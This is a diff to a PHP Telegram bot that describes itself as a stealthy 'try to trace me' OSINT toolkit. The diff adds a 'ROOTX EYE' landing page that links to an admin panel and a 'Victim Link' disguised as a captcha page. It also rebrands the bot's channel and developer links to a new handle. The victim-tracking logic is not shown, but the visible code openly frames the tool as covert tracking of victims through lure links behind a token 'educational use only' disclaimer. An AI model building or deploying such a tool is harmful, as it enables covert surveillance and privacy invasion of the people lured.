@@ -1,4 +1,40 @@
 <?php
+// ==================== ERROR REPORTING ====================
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+// ==================== WEB FALLBACK ====================
+// Agar koi browser se open kare toh yeh dikhao
+if (!isset($_GET['bot']) && !isset($_POST['bot']) && php_sapi_name() !== 'cli') {
+    echo "<!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset='UTF-8'>
+        <title>ROOTX EYE</title>
+        <style>
+            body { background: #0a0a1a; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #fff; margin: 0; }
+            .container { text-align: center; }
+            h1 { font-size: 48px; background: linear-gradient(45deg, #ff0033, #ff0066); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+            .links { margin-top: 30px; }
+            .links a { display: inline-block; margin: 10px 20px; padding: 12px 30px; background: linear-gradient(45deg, #ff0033, #ff0066); color: #fff; text-decoration: none; border-radius: 8px; font-weight: bold; transition: 0.3s; }
+            .links a:hover { transform: scale(1.05); }
+            .sub { color: #666; margin-top: 10px; }
+        </style>
+    </head>
+    <body>
+        <div class='container'>
+            <h1>👁️ ROOTX EYE</h1>
+            <p class='sub'>System is running</p>
+            <div class='links'>
+                <a href='admin.php'>📊 Admin Panel</a>
+                <a href='captcha.php?target=cf&id=123456789'>🔗 Victim Link</a>
+            </div>
+        </div>
+    </body>
+    </html>";
+    exit;
+}
 
  $botToken = '';
  $apiURL   = "https://api.telegram.org/bot$botToken";
@@ -147,7 +183,7 @@ function joinKB() {
     return [
         [ 
             ['text' => '🩸 Join', 'url' => 'https://t.me/' . ltrim($channel1, '@')],
-            ['text' => '🩸 Join', 'url' => 'https://t.me/shadowinnovations']
+            ['text' => '🩸 Join', 'url' => 'https://t.me/ROOTX_FALCON']
         ],
         [ 
             ['text' => '🩸 Join', 'url' => 'https://t.me/' . ltrim($channel3, '@')]
@@ -352,7 +388,7 @@ if($cb_data) {
     elseif($cb_data==='settings') {
         acb($cb_id,"⚙️");dm($cb_chat_id,$cb_msg_id);
         sm($cb_chat_id,"⚙️ *SETTINGS*\n━━━━━━━━━━━━━━━━━━━━\n\n👤 User: *{$first_name}*\n🆔 ID: `{$cb_chat_id}`\n🛡 Status: *Verified*",[
-            [['text'=>'🩸 Updates','url'=>'https://t.me/Scriptifydevs'],['text'=>'ℹ️ About','callback_data'=>'about']],
+            [['text'=>'🩸 Updates','url'=>'https://t.me/ROOTX_FALCON'],['text'=>'ℹ️ About','callback_data'=>'about']],
             [['text'=>'🏠 Menu','callback_data'=>'back_home']]
         ]);
     }
@@ -361,7 +397,7 @@ if($cb_data) {
     elseif($cb_data==='about') {
         acb($cb_id,"ℹ️");dm($cb_chat_id,$cb_msg_id);
         sm($cb_chat_id,"💀 *try to trace me bot*\n━━━━━━━━━━━━━━━━━━━━\n\n⚡ Advanced OSINT Toolkit\n👨💻 Dev: @Scriptifydevs\n🎯 Modules: 6 Active\n🛡 Stealth: 100% Invisible\n📊 Users: ".count(ld($usersFile))."\n\n_⚠️ Educational use only._",[
-            [['text'=>'🩸 Dev','url'=>'https://t.me/XBlackHat'],['text'=>'🩸 Updates','url'=>'https://t.me/Scriptifydevs']],
+            [['text'=>'🩸 Dev','url'=>'https://www.instagram.com/mr._rootx_.falcon?igsi=Nms4dnNyMXM1eXl3'],['text'=>'🩸 Updates','url'=>'https://t.me/ROOTX_FALCON']],
             [['text'=>'🏠 Menu','callback_data'=>'back_home']]
         ]);
     }
